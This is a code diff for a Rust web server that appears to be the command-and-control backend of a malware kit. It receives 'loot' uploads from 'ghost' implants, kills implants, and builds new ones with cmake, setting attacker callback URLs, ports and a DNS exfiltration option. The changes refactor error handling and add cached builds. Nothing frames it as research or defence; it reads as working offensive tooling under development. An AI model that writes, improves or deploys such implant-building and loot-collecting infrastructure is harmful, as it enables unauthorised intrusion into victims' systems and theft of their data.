@@ -1,7 +1,9 @@
 use axum::{
     extract::{State, Path},
     routing::{get, post},
-    Json, Router
+    http::StatusCode,
+    Json, Router,
+    body::Bytes
 };
 use dashmap::DashMap;
 use serde::{Deserialize, Serialize};
@@ -10,6 +12,8 @@ use std::process::Stdio;
 use tokio::process::Command;
 use uuid::Uuid;
 use tower_http::services::ServeDir;
+use std::collections::hash_map::DefaultHasher;
+use std::hash::{Hash, Hasher};
 
 // === ENUMS ===
 #[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
@@ -206,7 +210,7 @@ async fn handle_ghost_upload(
     }
 
     println!("loot saved to {}", filename);
-    Json("ACK").to_string()
+    Json("ACK".to_string())
 }
 
 // === CHARON
@@ -314,19 +318,18 @@ async fn handle_charon_kill_ghost(
 async fn handle_charon_build(
     State(_state): State<Arc<ServerState>>,
     Json(req): Json<GhostBuildRequest>
-) -> Result<Json<String>, String> {
+) -> Result<Json<String>, (StatusCode, String)> {
     println!("build requested for target {}:{}", req.target_url, req.target_port);
     
-    let build_id = Uuid::now_v7().to_string();
-    let source_path = std::env::var("GHOST_SOURCE_PATH").unwrap_or("/usr/src/GHOST".to_string());
-
-    let build_base = std::env::var("SHADOW_BUILD_DIR").unwrap_or("builds".to_string());
-    let build_dir = std::path::Path::new(&build_base).join(&build_id);
-
-    tokio::fs::create_dir_all(&build_dir).await.map_err(|e| format!("fs error: {}", e))?;
-
+    let source_path_raw = std::env::var("GHOST_SOURCE_PATH").unwrap_or("../GHOST".to_string());
+    let source_path = std::fs::canonicalize(&source_path_raw)
+        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("failed to find source at {} {}", source_path_raw, e)))?
+        .to_string_lossy()
+        .to_string();
+    
     let mut args = vec![
         source_path,
+        "-DCPR_USE_SYSTEM_CURL=ON".to_string(),
         format!("-DSHADOW_URL={}", req.target_url),
         format!("-DSHADOW_PORT={}", req.target_port),
         format!("-DENABLE_DEBUG={}", if req.enable_debug { "ON" } else { "OFF" }),
@@ -351,7 +354,20 @@ async fn handle_charon_build(
         args.push(format!("-DEXFIL_DNS={}", if req.exfil_dns { "ON" } else { "OFF" }));
     }
 
-    println!("runnin cmake in {:?}", build_dir);
+    let mut hasher = DefaultHasher::new();
+    args.hash(&mut hasher);
+    let build_id = hasher.finish().to_string();
+
+    let build_base = std::env::var("SHADOW_BUILD_DIR").unwrap_or("builds".to_string());
+    let build_dir = std::path::Path::new(&build_base).join(&build_id);
+
+    // if dir exists, reuse it
+    if !build_dir.exists() {
+        tokio::fs::create_dir_all(&build_dir).await.map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("fs error: {}", e)))?;
+    }
+
+    // cmake checks cache every time, no need for external mechanisms
+    println!("running cmake in {:?}", build_dir);
     let cmake_output = Command::new("cmake")
         .current_dir(&build_dir)
         .args(&args)
@@ -359,28 +375,29 @@ async fn handle_charon_build(
         .stderr(Stdio::piped())
         .output()
         .await
-        .map_err(|e| format!("cmake failed {}", e))?;
+        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("cmake failed {}", e)))?;
 
     if !cmake_output.status.success() {
         let err_msg = String::from_utf8_lossy(&cmake_output.stderr);
 
-        return Err(format!("cmake failed {}", err_msg));
+        return Err((StatusCode::INTERNAL_SERVER_ERROR, format!("cmake failed {}", err_msg)));
     }
 
+    // incremental because of reused dir + ccache
     println!("running make in {:?}", build_dir);
     let make_output = Command::new("make")
         .current_dir(&build_dir)
-        .arg("-j4")     // multithread, why not
+        .arg("-j4")
         .stdout(Stdio::piped())
         .stderr(Stdio::piped())
         .output()
         .await
-        .map_err(|e| format!("make failed {}", e))?;
+        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("make failed {}", e)))?;
 
     if !make_output.status.success() {
         let err_msg = String::from_utf8_lossy(&make_output.stderr);
 
-        return Err(format!("make failed {}", err_msg));
+        return Err((StatusCode::INTERNAL_SERVER_ERROR, format!("make failed {}", err_msg)));
     }
 
     // TODO fix path to not use bin/ghost uwu 
